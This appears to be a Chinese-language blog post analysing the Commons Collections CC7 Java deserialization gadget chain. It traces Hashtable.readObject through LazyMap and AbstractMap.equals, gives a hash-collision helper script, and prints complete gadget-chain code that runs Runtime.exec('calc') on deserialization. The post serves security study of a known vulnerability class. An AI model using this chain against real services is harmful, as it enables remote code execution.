---
title: cc7
date: 2022-03-31 16:57:10
tags:
      - java
      - commons-collections
categories: java
---

### CC7

<!--more-->

![image-20220401002812718](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220401002812718.png)

之前的链都是看的别人的讲解,剩的这条链要自己分析一下

后半段依然用的是LazyMap的get方法,

`AbstractMap.equals`方法中调用了get方法

##### Hashtable

Hashtable可以理解为线程安全的散列表hashMap

先看Hashtable的序列化过程

```java
private void writeObject(java.io.ObjectOutputStream s)
            throws IOException {
        Entry<Object, Object> entryStack = null;

        synchronized (this) {
            // Write out the length, threshold, loadfactor
            s.defaultWriteObject();

            // Write out length, count of elements
            s.writeInt(table.length);//写入table的容量
            s.writeInt(count);//写入table的元素个数

            // Stack copies of the entries in the table
            for (int index = 0; index < table.length; index++) {
                Entry<?,?> entry = table[index];

                while (entry != null) {
                    entryStack =
                        new Entry<>(0, entry.key, entry.value, entryStack);
                    entry = entry.next;
                }
            }
        }

        // Write out the key/value objects from the stacked entries
        while (entryStack != null) {
            s.writeObject(entryStack.key);
            s.writeObject(entryStack.value);
            entryStack = entryStack.next;
        }
    //因为经历了一次入栈和出栈,所以序列化后顺序刚好是反的
    }
```

![image-20220331000545609](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331000545609.png)

![image-20220331000314892](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331000314892.png)

使用zkar分析后的确如此,序列化后是反的,但是后面反序列化的时候并没有再反一次让它正过来

```java
private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Compute new size with a bit of room 5% to grow but
        // no larger than the original size.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // synch could be eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }
```

readObject方法中,先根据之前写入的两个Int值,计算出需要创建的table的大小,然后创建一个table,然后从反序列化流中依次读取元素并调用`reconstitutionPut`方法,然后将其中的key和value放入table

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
    //这里利用key的hashcode计算出在hash表中的index
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            //这里检查已经在index位置上的元素的hash是否与其相等,相等的话则调用equals方法
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

到这里逻辑就基本清楚了,就是送入两个值一样的`map`,让他们的`key`在这里触发`equals`方法,

> 来捋一捋调用链的流程

首先需要满足Hashtable中的两个元素的hashCode相等,那么这里是怎么计算hashCode的呢

<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331224615938.png" alt="image-20220331224615938" style="zoom:67%;" />

起初tab是空的,反序列化取出第一个元素后才会进入for循环,其中e.hash是第一个元素的hash值,这里的hash来自于key的hashCode,而Hashtable的key是构造好的lazyMap,由于if语句中执行顺序的关系,需要先满足第一个条件才会接着执行下一个条件的语句

由于此时求得是lazyMap的hashCode,所以直接去看lazyMap的hashCode方法,但是lazyMap没有hashCode方法,找到它继承的抽象父类`AbstractMapDecorator`里面有hashCode方法,和equls一样,它也调用的是当前map的方法

<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331225017982.png" alt="image-20220331225017982" style="zoom:67%;" />

由于map实际上是`HashMap`类型的,所以直接去看`HashMap`的`hashCode`,它里面也没有`hashCode`方法,在它的抽象父类`AbstractMap`中找到了`hashCode`方法

<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331225222273.png" alt="image-20220331225222273" style="zoom:67%;" />

这里的i.next().hashCode调用了Object的hashCode分别计算key和value的hash并做异或

```java
public final int hashCode() {
            return Objects.hashCode(key) ^ Objects.hashCode(value);
        }
```

Object的hashCode方法只要传入的参数不为null,则调用该参数自身的hashCode

```java
public static int hashCode(Object o) {
        return o != null ? o.hashCode() : 0;
    }
```

对于key来说,也就是String 的hashCode

```java
 public int hashCode() {
        int h = hash;
        if (h == 0 && value.length > 0) {
            char val[] = value;

            for (int i = 0; i < value.length; i++) {
                h = 31 * h + val[i];
            }
            hash = h;
        }
        return h;
    }
```

而value Integer类型的hashCode函数则返回其本身

```java
public static int hashCode(int value) {
        return value;
    }
```

根据String计算hashCode的方式编写找hashCode相等的字符串的脚本:

```python
import string
#获取全部字母的数组
letter=string.ascii_letters
print(letter)

def hashCode(str):
    return 31*ord(str[0])+ord(str[1])

#随机组合成两个的字符串
for i in letter:
    for j in letter:
        for k in letter:
            for l in letter:
                str1=i+j
                str2=k+l

                if (str1!=str2 and hashCode(str1)==hashCode(str2)):
                    print(str1+"  hash===  "+str2)
```

首先通过Hashtable的readObject触发`Hashtable.reconstitutionPut`,由于`yy`和`zZ`的hashCode相等,所以触发`equals`方法,LazyMap是没有equals方法的,但是它继承的抽象类`AbstractMapDecorator`实现了`equals`方法

![image-20220331011008494](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331011008494.png)

它只要判断传入的对象不是当前对象,则调用map的equals方法,这里的map就是lazyMap中的map属性,由于起初lazyMap初始化的时候map传递的是`HashMap`,所以会调用`HashMap`的`equals`方法,但是HashMap并没有`equals`方法,但是它继承的抽象父类`AbstractMap`有,map属性需要满足3条就可以,`1.不是同一对象2.实现了Map接口3.o和当前map 的元素个数相等`

![image-20220331011543850](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331011543850.png)

接着就会调用map的get,虽然o被转型为了Map,但是其本质上还是LazyMap,所以这里调用`m.get`就相当于调用了`lazyMap2.get`至于这里调用的是第二个lazyMap的get但是为什么key是"yy"而不是"zz"原因还是序列化的时候的那一波出入栈操作![image-20220331012704699](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331012704699.png)



```java
public static void main(String[] args)throws Exception {

        Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer Chainedtransform = new ChainedTransformer(new Transformer[]{});
    	//可以替换为 ... = new ChainedTransformer(new Transformer[]{new ConstantTransformer(0)});

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, Chainedtransform);
        Map lazyMap2 = LazyMap.decorate(innerMap2, Chainedtransform);
        lazyMap1.put("yy",1);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        lazyMap2.remove("yy");

        System.out.println("lazyMap1 hashcode:" + lazyMap1.hashCode());
        System.out.println("lazyMap2 hashcode:" + lazyMap2.hashCode());

        Class<? extends Transformer> chainedtransformClass = Chainedtransform.getClass();
        Field iTransformers = chainedtransformClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(Chainedtransform,transformers);

        SerializeTest.serialize(hashtable);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");
    }
```









##### 为什么会lazyMap2会多出一个"yy=yy"

hashTable在put的时候会调用

<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331180337409.png" alt="image-20220331180337409" style="zoom:80%;" />

entry.key.equals(key),  entry.key是lazyMap1, key也就是lazyMap2,然后会调用到`AbstractMap.equals`(lazyMap2)

![image-20220331172723005](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331172723005.png)

在里面会调用到lazyMap2的get方法,这里传进去的参数`key`是第一个lazyMap的key, `m`代表的是lazyMap2,调用了第二个`lazyMap的get("yy")`,由于`"yy"`在lazyMap2中不存在,所以会调用`ChainedTransformer.transform("yy")`

![image-20220331173811180](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331173811180.png)

![image-20220331173729480](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331173729480.png)

由于当前的itransform数组长度为0,所以返回的是"yy",

接着`LazyMap.get`方法把传入的key当key,transform(key)得到的值当成value,put一个`entry`进到lazyMap2里面,也就是"yy="yy"



>起初为了防止在put的时候就执行代码,我用了`ConstantTransformer(1)`代替了`Tranformer`数组,但是出现了put不成功的情况,只能putLazyMap进去,这个问题需要探究一下



接着上面的分析,最后给下面画红线的地方中equals()中的值就是上面最后transform返回的结果,value是Hashtable中第一个entry的value,也就是1,所以这块是`1.equals(  )`,只要不是1就满足结果

![image-20220331182218564](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331182218564.png)











##### 为什么要remove()

因为在调用到`AbstractMap.equals`的时候,会判断两个map的长度是否一致,如果不一致则不会进行下面的get调用了

![image-20220331174106161](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220331174106161.png)
